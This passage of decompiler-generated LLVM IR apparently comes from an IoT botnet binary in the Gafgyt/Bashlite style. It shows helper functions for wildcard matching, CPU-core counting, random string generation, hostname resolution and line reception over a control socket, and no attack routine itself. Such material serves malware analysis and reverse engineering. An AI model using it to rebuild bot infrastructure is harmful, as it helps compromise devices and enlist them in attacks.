  br i1 %v7_941c, label %dec_label_pc_9450, label %dec_label_pc_9424

dec_label_pc_9424:                                ; preds = %entry
  %v7_9428 = icmp eq i8 %v2_9410, 63
  br i1 %v7_9428, label %dec_label_pc_94c0, label %dec_label_pc_9430

dec_label_pc_9430:                                ; preds = %dec_label_pc_9424
  %v2_9434 = icmp eq i8 %v2_9410, 0
  br i1 %v2_9434, label %dec_label_pc_9440, label %dec_label_pc_9518

dec_label_pc_9440:                                ; preds = %dec_label_pc_9430
  %v2_9444 = load i8, i8* %tmp, align 1
  %v3_9444 = zext i8 %v2_9444 to i32
  br label %dec_label_pc_958c

dec_label_pc_9450:                                ; preds = %entry
  %v1_9454 = add i32 %tmp8, 1
  %v3_9460 = inttoptr i32 %v1_9454 to i8*
  %v4_9460 = call i32 @wildString(i8* %v3_9460, i32 %arg2)
  %v2_9468 = icmp eq i32 %v4_9460, 0
  br i1 %v2_9468, label %dec_label_pc_94ac, label %dec_label_pc_9470

dec_label_pc_9470:                                ; preds = %dec_label_pc_9450
  %v2_9474 = load i8, i8* %tmp, align 1
  %v2_9478 = icmp eq i8 %v2_9474, 0
  br i1 %v2_9478, label %dec_label_pc_94b4, label %dec_label_pc_9480

dec_label_pc_9480:                                ; preds = %dec_label_pc_9470
  %v1_9484 = add i32 %arg2, 1
  %v4_9490 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9484)
  %v2_9498 = icmp eq i32 %v4_9490, 0
  br i1 %v2_9498, label %dec_label_pc_94ac, label %dec_label_pc_94b4

dec_label_pc_94ac:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9450
  br label %dec_label_pc_94b4

dec_label_pc_94b4:                                ; preds = %dec_label_pc_9470, %dec_label_pc_9480, %dec_label_pc_94ac
  %storemerge3 = phi i32 [ 0, %dec_label_pc_94ac ], [ 1, %dec_label_pc_9480 ], [ 1, %dec_label_pc_9470 ]
  br label %dec_label_pc_958c

dec_label_pc_94c0:                                ; preds = %dec_label_pc_9424
  %v2_94c4 = load i8, i8* %tmp, align 1
  %v2_94c8 = icmp eq i8 %v2_94c4, 0
  br i1 %v2_94c8, label %dec_label_pc_950c, label %dec_label_pc_94d0

dec_label_pc_94d0:                                ; preds = %dec_label_pc_94c0
  %v1_94d4 = add i32 %tmp8, 1
  %v1_94dc = add i32 %arg2, 1
  %v2_94e8 = inttoptr i32 %v1_94d4 to i8*
  %v3_94e8 = call i32 @wildString(i8* %v2_94e8, i32 %v1_94dc)
  %v2_94f0 = icmp ne i32 %v3_94e8, 0
  %. = zext i1 %v2_94f0 to i32
  br label %dec_label_pc_950c

dec_label_pc_950c:                                ; preds = %dec_label_pc_94d0, %dec_label_pc_94c0
  %storemerge2 = phi i32 [ 1, %dec_label_pc_94c0 ], [ %., %dec_label_pc_94d0 ]
  br label %dec_label_pc_958c

dec_label_pc_9518:                                ; preds = %dec_label_pc_9430
  %v2_951c = load i8, i8* %arg1, align 1
  %v3_951c = zext i8 %v2_951c to i32
  %v1_9524 = call i32 @__GI_toupper(i32 %v3_951c)
  store i32 %v1_9524, i32* @r4, align 4
  %v2_9530 = load i8, i8* %tmp, align 1
  %v3_9530 = zext i8 %v2_9530 to i32
  %v1_9538 = call i32 @__GI_toupper(i32 %v3_9530)
  %v0_9540 = load i32, i32* @r4, align 4
  %v9_9540 = icmp eq i32 %v0_9540, %v1_9538
  br i1 %v9_9540, label %dec_label_pc_9548, label %dec_label_pc_9584

dec_label_pc_9548:                                ; preds = %dec_label_pc_9518
  %v1_954c = add i32 %tmp8, 1
  %v1_9554 = add i32 %arg2, 1
  %v2_9560 = inttoptr i32 %v1_954c to i8*
  %v3_9560 = call i32 @wildString(i8* %v2_9560, i32 %v1_9554)
  %v2_9568 = icmp ne i32 %v3_9560, 0
  %.7 = zext i1 %v2_9568 to i32
  br label %dec_label_pc_9584

dec_label_pc_9584:                                ; preds = %dec_label_pc_9548, %dec_label_pc_9518
  %storemerge = phi i32 [ 1, %dec_label_pc_9518 ], [ %.7, %dec_label_pc_9548 ]
  br label %dec_label_pc_958c

dec_label_pc_958c:                                ; preds = %dec_label_pc_950c, %dec_label_pc_94b4, %dec_label_pc_9440, %dec_label_pc_9584
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_94b4 ], [ %storemerge2, %dec_label_pc_950c ], [ %v3_9444, %dec_label_pc_9440 ], [ %storemerge, %dec_label_pc_9584 ]
  store i32 %v3_93f8, i32* @r4, align 4
  store i32 %v6_93f8, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_958c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_94b4, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_95c0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95c0, i32* %arg2, align 4
  %v3_95d8 = icmp eq i32 %v1_95c0, -1
  %. = zext i1 %v3_95d8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_9618 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9618 to i8*
  %v2_96503 = load i8, i8* %storemerge2, align 1
  %v2_96545 = icmp eq i8 %v2_96503, 0
  br i1 %v2_96545, label %dec_label_pc_965c, label %dec_label_pc_9620

dec_label_pc_9620:                                ; preds = %entry, %dec_label_pc_9620
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9620 ], [ %storemerge2, %entry ]
  %storemerge.in6 = phi i32 [ %v1_9644, %dec_label_pc_9620 ], [ %v0_9618, %entry ]
  %v2_9624 = load i8, i8* %storemerge7, align 1
  %v3_9624 = zext i8 %v2_9624 to i32
  store i32 %v3_9624, i32* %r0.global-to-local, align 4
  %v1_962c = call i32 @__GI_toupper(i32 %v3_9624)
  store i32 %v1_962c, i32* %r0.global-to-local, align 4
  %v1_963c = trunc i32 %v1_962c to i8
  store i8 %v1_963c, i8* %storemerge7, align 1
  %v1_9644 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9644 to i8*
  %v2_9650 = load i8, i8* %storemerge, align 1
  %v2_9654 = icmp eq i8 %v2_9650, 0
  br i1 %v2_9654, label %dec_label_pc_964c.dec_label_pc_965c_crit_edge, label %dec_label_pc_9620

dec_label_pc_964c.dec_label_pc_965c_crit_edge:    ; preds = %dec_label_pc_9620
  %v1_9664.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_965c

dec_label_pc_965c:                                ; preds = %dec_label_pc_964c.dec_label_pc_965c_crit_edge, %entry
  %v1_9664 = phi i32 [ %v1_9664.pre, %dec_label_pc_964c.dec_label_pc_965c_crit_edge ], [ %v0_9618, %entry ]
  ret i32 %v1_9664

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9644, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_9618, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9620, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 -4108, i32* @r3, align 4
  %v2_9684 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_9684, i32* @r2, align 4
  %v3_9694 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_23a6c.52 to i32), i32 0)
  %v2_984c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_96b4 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_9844

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9844
  %v2_96b4 = call i32 @uppercase(i8* %v1_96b4)
  %v4_96cc = call i32 @strstr(i32 %v2_984c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23a7c.54, i32 0, i32 0))
  %v9_96e4 = icmp eq i32 %v4_96cc, %v2_984c
  br i1 %v9_96e4, label %dec_label_pc_96ec, label %dec_label_pc_9828

dec_label_pc_96ec:                                ; preds = %dec_label_pc_96a4
  %tmp21 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9710

dec_label_pc_9704:                                ; preds = %dec_label_pc_9730, %dec_label_pc_9720, %dec_label_pc_9710
  %v1_9708 = add i32 %v4_9710, 1
  %v5_970c = inttoptr i32 %v1_9708 to i8*
  br label %dec_label_pc_9710

dec_label_pc_9710:                                ; preds = %dec_label_pc_96ec, %dec_label_pc_9704
  %storemerge2 = phi i8* [ %v5_970c, %dec_label_pc_9704 ], [ %tmp21, %dec_label_pc_96ec ]
  %v4_9710 = ptrtoint i8* %storemerge2 to i32
  %v2_9714 = load i8, i8* %storemerge2, align 1
  %v7_9718 = icmp eq i8 %v2_9714, 32
  br i1 %v7_9718, label %dec_label_pc_9704, label %dec_label_pc_9720

dec_label_pc_9720:                                ; preds = %dec_label_pc_9710
  %v2_9724 = load i8, i8* %storemerge2, align 1
  %v7_9728 = icmp eq i8 %v2_9724, 9
  br i1 %v7_9728, label %dec_label_pc_9704, label %dec_label_pc_9730

dec_label_pc_9730:                                ; preds = %dec_label_pc_9720
  %v2_9734 = load i8, i8* %storemerge2, align 1
  %v7_9738 = icmp eq i8 %v2_9734, 58
  br i1 %v7_9738, label %dec_label_pc_9704, label %dec_label_pc_9768.preheader

dec_label_pc_9768.preheader:                      ; preds = %dec_label_pc_9730
  %v1_976c = add i32 %v4_9710, -1
  br label %dec_label_pc_9768

dec_label_pc_9744:                                ; preds = %dec_label_pc_9790, %dec_label_pc_9768
  %v3_9754 = call i32 @strlen(i8* %storemerge2)
  %v2_975c = add i32 %v1_976c, %v3_9754
  %v3_9764 = inttoptr i32 %v2_975c to i8*
  store i8 0, i8* %v3_9764, align 1
  br label %dec_label_pc_9768

dec_label_pc_9768:                                ; preds = %dec_label_pc_9768.preheader, %dec_label_pc_9744
  %v3_9778 = call i32 @strlen(i8* %storemerge2)
  %v2_9780 = add i32 %v1_976c, %v3_9778
  %v1_9784 = inttoptr i32 %v2_9780 to i8*
  %v2_9784 = load i8, i8* %v1_9784, align 1
  %v7_9788 = icmp eq i8 %v2_9784, 13
  br i1 %v7_9788, label %dec_label_pc_9744, label %dec_label_pc_9790

dec_label_pc_9790:                                ; preds = %dec_label_pc_9768
  store i32 %v1_976c, i32* @r4, align 4
  %v3_97a0 = call i32 @strlen(i8* %storemerge2)
  %v0_97a8 = load i32, i32* @r4, align 4
  %v2_97a8 = add i32 %v0_97a8, %v3_97a0
  %v1_97ac = inttoptr i32 %v2_97a8 to i8*
  %v2_97ac = load i8, i8* %v1_97ac, align 1
  %v7_97b0 = icmp eq i8 %v2_97ac, 10
  br i1 %v7_97b0, label %dec_label_pc_9744, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9790
  store i32 %v4_9710, i32* @r0, align 4
  %v2_97c4 = call i32 @__GI_strchr(i32 %v4_9710, i32 46)
  %v2_97cc = icmp eq i32 %v2_97c4, 0
  br i1 %v2_97cc, label %dec_label_pc_97f0, label %dec_label_pc_97d4

dec_label_pc_97d4:                                ; preds = %dec_label_pc_97b8
  store i32 %v4_9710, i32* @r0, align 4
  %v2_97e0 = call i32 @__GI_strchr(i32 %v4_9710, i32 46)
  %v3_97ec = inttoptr i32 %v2_97e0 to i8*
  store i8 0, i8* %v3_97ec, align 1
  br label %dec_label_pc_97f0

dec_label_pc_97f0:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_97d4
  store i32 %v4_9710, i32* @r1, align 4
  %v2_980c = inttoptr i32 %arg1 to i8*
  %v3_980c = call i32 @strcpy(i8* %v2_980c, i32 %v4_9710)
  %v1_9814 = call i32 @__GI___libc_close(i32 %v3_9694)
  br label %dec_label_pc_9880

dec_label_pc_9828:                                ; preds = %dec_label_pc_96a4
  %v4_9840 = call i32 @__GI_memset(i8* %v1_96b4, i32 0, i32 4096)
  br label %dec_label_pc_9844

dec_label_pc_9844:                                ; preds = %entry, %dec_label_pc_9828
  %v4_985c = call i32 @fdgets(i32 %v2_984c, i32 4096, i32 %v3_9694, i32 %v2_984c)
  %v2_9864 = icmp eq i32 %v4_985c, 0
  br i1 %v2_9864, label %dec_label_pc_986c, label %dec_label_pc_96a4

dec_label_pc_986c:                                ; preds = %dec_label_pc_9844
  %v1_9870 = call i32 @__GI___libc_close(i32 %v3_9694)
  br label %dec_label_pc_9880

dec_label_pc_9880:                                ; preds = %dec_label_pc_97f0, %dec_label_pc_986c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_986c ], [ 0, %dec_label_pc_97f0 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_976c, { 2, 1, 0 }
  uselistorder i32 %v4_9710, { 3, 2, 1, 0, 5, 4, 6, 7 }
  uselistorder i8* %storemerge2, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i32 %v2_984c, { 0, 3, 1, 2 }
  uselistorder i32 %v3_9694, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9880, { 1, 0 }
  uselistorder label %dec_label_pc_9844, { 1, 0 }
  uselistorder label %dec_label_pc_97f0, { 1, 0 }
  uselistorder label %dec_label_pc_9768, { 1, 0 }
  uselistorder label %dec_label_pc_9710, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %stack_var_-4120 = alloca i32, align 4
  %v2_98b0 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v3_98c4 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_23a6c.52 to i32), i32 0)
  %v1_98e4 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9940

dec_label_pc_98d4:                                ; preds = %dec_label_pc_9940
  %v2_98e4 = call i32 @uppercase(i8* %v1_98e4)
  %v4_98fc = call i32 @strstr(i32 %v2_98b0, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23a7c.54, i32 0, i32 0))
  %v9_9910 = icmp eq i32 %v4_98fc, %v2_98b0
  br i1 %v9_9910, label %dec_label_pc_9918, label %dec_label_pc_9924

dec_label_pc_9918:                                ; preds = %dec_label_pc_98d4
  %v1_991c = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_98d4, %dec_label_pc_9918
  %stack_var_-24.0 = phi i32 [ %v1_991c, %dec_label_pc_9918 ], [ %stack_var_-24.1, %dec_label_pc_98d4 ]
  %v4_993c = call i32 @__GI_memset(i8* %v1_98e4, i32 0, i32 4096)
  br label %dec_label_pc_9940

dec_label_pc_9940:                                ; preds = %entry, %dec_label_pc_9924
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_9924 ]
  %v4_9958 = call i32 @fdgets(i32 %v2_98b0, i32 4096, i32 %v3_98c4, i32 %v2_98b0)
  %v2_9960 = icmp eq i32 %v4_9958, 0
  br i1 %v2_9960, label %dec_label_pc_9968, label %dec_label_pc_98d4

dec_label_pc_9968:                                ; preds = %dec_label_pc_9940
  %v1_996c = call i32 @__GI___libc_close(i32 %v3_98c4)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_98b0, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9940, { 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_9990 = load i32, i32* @r4, align 4
  %v6_9990 = load i32, i32* @fp, align 4
  %v0_999c = load i32, i32* %r0.global-to-local, align 4
  %v5_9a3024 = icmp sgt i32 %arg2, 0
  br i1 %v5_9a3024, label %dec_label_pc_99b8, label %dec_label_pc_9a34

dec_label_pc_99b8:                                ; preds = %entry, %dec_label_pc_99b8
  %storemerge725 = phi i32 [ %v1_9a1c, %dec_label_pc_99b8 ], [ 0, %entry ]
  %v2_99c4 = add i32 %storemerge725, %v0_999c
  store i32 %v2_99c4, i32* @r4, align 4
  %v0_99c8 = call i32 @rand_cmwc()
  store i32 %v0_99c8, i32* %r0.global-to-local, align 4
  %v3_99d8 = udiv i32 %v0_99c8, 26
  %tmp = mul nsw i32 %v3_99d8, -2
  %v2_99fc = add i32 %v0_99c8, %tmp
  %fold = add i32 %v2_99fc, 65
  %v1_9a14 = trunc i32 %fold to i8
  %v2_9a14 = load i32, i32* @r4, align 4
  %v3_9a14 = inttoptr i32 %v2_9a14 to i8*
  store i8 %v1_9a14, i8* %v3_9a14, align 1
  %v1_9a1c = add nuw nsw i32 %storemerge725, 1
  %v5_9a30 = icmp slt i32 %v1_9a1c, %arg2
  br i1 %v5_9a30, label %dec_label_pc_99b8, label %dec_label_pc_9a24.dec_label_pc_9a34_crit_edge

dec_label_pc_9a24.dec_label_pc_9a34_crit_edge:    ; preds = %dec_label_pc_99b8
  %v1_9a3c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a34

dec_label_pc_9a34:                                ; preds = %dec_label_pc_9a24.dec_label_pc_9a34_crit_edge, %entry
  %v1_9a3c = phi i32 [ %v1_9a3c.pre, %dec_label_pc_9a24.dec_label_pc_9a34_crit_edge ], [ %v0_999c, %entry ]
  store i32 %v3_9990, i32* @r4, align 4
  store i32 %v6_9990, i32* @fp, align 4
  ret i32 %v1_9a3c

; uselistorder directives
  uselistorder i32 %v1_9a1c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_99b8, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a98.lr.ph:
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a48 = load i32, i32* @fp, align 4
  store i32 %v3_9a48, i32* %stack_var_-16, align 4
  store i32 39504, i32* %stack_var_-4, align 4
  %v2_9a4c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a4c, i32* @fp, align 4
  %v5_9a70 = call i32 @__GI_memset(i8* %arg2, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9a84 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9a98

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a98.lr.ph, %dec_label_pc_9a98
  %storemerge628 = phi i32 [ 0, %dec_label_pc_9a98.lr.ph ], [ %v1_9aac, %dec_label_pc_9a98 ]
  %v5_9aa4 = mul nuw nsw i32 %storemerge628, 4
  %v6_9aa4 = add i32 %v5_9aa4, %v2_9a84
  %v7_9aa4 = inttoptr i32 %v6_9aa4 to i32*
  store i32 0, i32* %v7_9aa4, align 4
  %v1_9aac = add nuw nsw i32 %storemerge628, 1
  %tmp53 = icmp ult i32 %v1_9aac, 32
  br i1 %tmp53, label %dec_label_pc_9a98, label %dec_label_pc_9ac0

dec_label_pc_9ac0:                                ; preds = %dec_label_pc_9a98
  %v13_9a48 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9ac4 = udiv i32 %arg1, 32
  %v3_9ad0 = mul nuw nsw i32 %v3_9ac4, 4
  %v2_9ad8 = add nsw i32 %v3_9ad0, -160
  %v2_9adc = add i32 %v2_9ad8, %v13_9a48
  %v1_9ae0 = inttoptr i32 %v2_9adc to i32*
  %v2_9ae0 = load i32, i32* %v1_9ae0, align 4
  %v1_9ae8 = urem i32 %arg1, 32
  %v6_9af0 = shl i32 1, %v1_9ae8
  %v2_9af4 = or i32 %v2_9ae0, %v6_9af0
  store i32 %v2_9af4, i32* %v1_9ae0, align 4
  %v1_9b14 = add i32 %arg1, 1
  %v2_9b20 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9b34 = call i32 @__libc_select(i32 %v1_9b14, i32 %v2_9a84, i32 0, i32 %v2_9a84, i32 %v2_9b20)
  %v5_9b48 = icmp sgt i32 %v5_9b34, 0
  br i1 %v5_9b48, label %dec_label_pc_9cdc.preheader, label %dec_label_pc_9c48.preheader

dec_label_pc_9c48.preheader:                      ; preds = %dec_label_pc_9ac0
  %v7_9c5024 = icmp slt i32 %tmp34, 10
  br i1 %v7_9c5024, label %dec_label_pc_9b88.lr.ph, label %dec_label_pc_9cdc.preheader

dec_label_pc_9b88.lr.ph:                          ; preds = %dec_label_pc_9c48.preheader, %dec_label_pc_9c3c
  %stack_var_-44.025 = phi i32 [ %v1_9c40, %dec_label_pc_9c3c ], [ %tmp34, %dec_label_pc_9c48.preheader ]
  %v2_9b54 = load i32, i32* @global_var_324c8.59, align 4
  %v3_9b60 = call i32 @HackerPrint(i32 %v2_9b54, i32 ptrtoint ([5 x i8]* @global_var_23a88.61 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9b88

dec_label_pc_9b88:                                ; preds = %dec_label_pc_9b88.lr.ph, %dec_label_pc_9b88
  %storemerge716 = phi i32 [ 0, %dec_label_pc_9b88.lr.ph ], [ %v1_9b9c, %dec_label_pc_9b88 ]
  %v5_9b94 = mul nuw nsw i32 %storemerge716, 4
  %v6_9b94 = add i32 %v5_9b94, %v2_9a84
  %v7_9b94 = inttoptr i32 %v6_9b94 to i32*
  store i32 0, i32* %v7_9b94, align 4
  %v1_9b9c = add nuw nsw i32 %storemerge716, 1
  %tmp54 = icmp ult i32 %v1_9b9c, 32
  br i1 %tmp54, label %dec_label_pc_9b88, label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %dec_label_pc_9b88
  %v2_9bd0 = load i32, i32* %v1_9ae0, align 4
  %v2_9be4 = or i32 %v2_9bd0, %v6_9af0
  store i32 %v2_9be4, i32* %v1_9ae0, align 4
  %v5_9c24 = call i32 @__libc_select(i32 %v1_9b14, i32 %v2_9a84, i32 0, i32 %v2_9a84, i32 %v2_9b20)
  %v5_9c38 = icmp sgt i32 %v5_9c24, 0
  br i1 %v5_9c38, label %dec_label_pc_9cdc.preheader, label %dec_label_pc_9c3c

dec_label_pc_9c3c:                                ; preds = %dec_label_pc_9bb0
  %v1_9c40 = add nsw i32 %stack_var_-44.025, 1
  %v7_9c50 = icmp slt i32 %v1_9c40, 10
  br i1 %v7_9c50, label %dec_label_pc_9b88.lr.ph, label %dec_label_pc_9cdc.preheader

dec_label_pc_9cdc.preheader:                      ; preds = %dec_label_pc_9c3c, %dec_label_pc_9bb0, %dec_label_pc_9c48.preheader, %dec_label_pc_9ac0
  %v2_9c70 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_9ce458 = icmp sgt i32 %arg3, 1
  %v2_9cfc60 = icmp eq i1 %not.v7_9ce458, false
  br i1 %v2_9cfc60, label %dec_label_pc_9d04, label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_9cdc.preheader, %dec_label_pc_9cd0
  %v1_9ce063.in = phi i32 [ %v1_9ce063, %dec_label_pc_9cd0 ], [ %arg3, %dec_label_pc_9cdc.preheader ]
  %stack_var_-40.062 = phi i8* [ %v5_9cc0, %dec_label_pc_9cd0 ], [ %arg2, %dec_label_pc_9cdc.preheader ]
  %stack_var_-36.061 = phi i32 [ %v1_9cd4, %dec_label_pc_9cd0 ], [ 0, %dec_label_pc_9cdc.preheader ]
  %v1_9ce063 = add i32 %v1_9ce063.in, -1
  %v2_9c6c = load i32, i32* @global_var_324c8.59, align 4
  %v5_9c84 = call i32 @__libc_recv(i32 %v2_9c6c, i32 %v2_9c70, i32 1, i32 0, i32 %v1_9ce063)
  %v7_9c8c = icmp eq i32 %v5_9c84, 1
  br i1 %v7_9c8c, label %dec_label_pc_9cac, label %dec_label_pc_9c94

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c68
  store i8 0, i8* %stack_var_-40.062, align 1
  br label %dec_label_pc_9d18

dec_label_pc_9cac:                                ; preds = %dec_label_pc_9c68
  %v3_9cac = load i8, i8* %stack_var_-185, align 1
  %v4_9cb0 = ptrtoint i8* %stack_var_-40.062 to i32
  store i8 %v3_9cac, i8* %stack_var_-40.062, align 1
  %v1_9cbc = add i32 %v4_9cb0, 1
  %v5_9cc0 = inttoptr i32 %v1_9cbc to i8*
  %v3_9cc4 = load i8, i8* %stack_var_-185, align 1
  %v7_9cc8 = icmp eq i8 %v3_9cc4, 10
  br i1 %v7_9cc8, label %dec_label_pc_9d04, label %dec_label_pc_9cd0

dec_label_pc_9cd0:                                ; preds = %dec_label_pc_9cac
  %v1_9cd4 = add i32 %stack_var_-36.061, 1
  %not.v7_9ce4 = icmp sgt i32 %v1_9ce063, 1
  %v2_9cfc = icmp eq i1 %not.v7_9ce4, false
  br i1 %v2_9cfc, label %dec_label_pc_9d04, label %dec_label_pc_9c68

dec_label_pc_9d04:                                ; preds = %dec_label_pc_9cac, %dec_label_pc_9cd0, %dec_label_pc_9cdc.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9cdc.preheader ], [ %v1_9cd4, %dec_label_pc_9cd0 ], [ %stack_var_-36.061, %dec_label_pc_9cac ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9cdc.preheader ], [ %v5_9cc0, %dec_label_pc_9cd0 ], [ %v5_9cc0, %dec_label_pc_9cac ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9d18

dec_label_pc_9d18:                                ; preds = %dec_label_pc_9c94, %dec_label_pc_9d04
  %storemerge = phi i32 [ -1, %dec_label_pc_9c94 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9d04 ]
  %v2_9d24 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9d24, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9ce063, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.062, { 1, 2, 0 }
  uselistorder i32 %v1_9c40, { 1, 0 }
  uselistorder i32 %storemerge716, { 1, 0 }
  uselistorder i32 %storemerge628, { 1, 0 }
  uselistorder i32 %v2_9a84, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9d18, { 1, 0 }
  uselistorder label %dec_label_pc_9d04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9c68, { 1, 0 }
  uselistorder label %dec_label_pc_9b88, { 1, 0 }
  uselistorder label %dec_label_pc_9b88.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9a98, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40256, i32* %stack_var_-4, align 4
  %v2_9d3c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d3c, i32* @fp, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_9d50 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_9d60 = icmp eq i32 %v1_9d50, 0
  br i1 %v2_9d60, label %dec_label_pc_9d68, label %dec_label_pc_9d7c

dec_label_pc_9d68:                                ; preds = %entry
  %v3_9d6c = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_23a90.63, i32 0, i32 0))
  br label %dec_label_pc_9df4

dec_label_pc_9d7c:                                ; preds = %entry
  %v1_9d80 = add i32 %v1_9d50, 16
  %v2_9d80 = inttoptr i32 %v1_9d80 to i32*
  %v3_9d80 = load i32, i32* %v2_9d80, align 4
  %v1_9da4 = inttoptr i32 %v3_9d80 to i32*
  %v2_9da4 = load i32, i32* %v1_9da4, align 4
  %v2_9da8 = icmp eq i32 %v2_9da4, 0
  br i1 %v2_9da8, label %dec_label_pc_9dec, label %dec_label_pc_9db0

dec_label_pc_9db0:                                ; preds = %dec_label_pc_9d7c
  %v2_9dc4 = load i32, i32* %v1_9da4, align 4
  %v1_9dc8 = inttoptr i32 %v2_9dc4 to i32*
  %v2_9dc8 = load i32, i32* %v1_9dc8, align 4
  store i32 %v2_9dc8, i32* @r0, align 4
  %v1_9dcc = call i32 @__GI_inet_ntoa(i32 %v2_9dc8)
  store i32 %v1_9dcc, i32* @r1, align 4
  %v2_9ddc = inttoptr i32 %arg2 to i8*
  %v3_9ddc = call i32 @strcpy(i8* %v2_9ddc, i32 %v1_9dcc)
  br label %dec_label_pc_9df4

dec_label_pc_9dec:                                ; preds = %dec_label_pc_9d7c
  br label %dec_label_pc_9df4

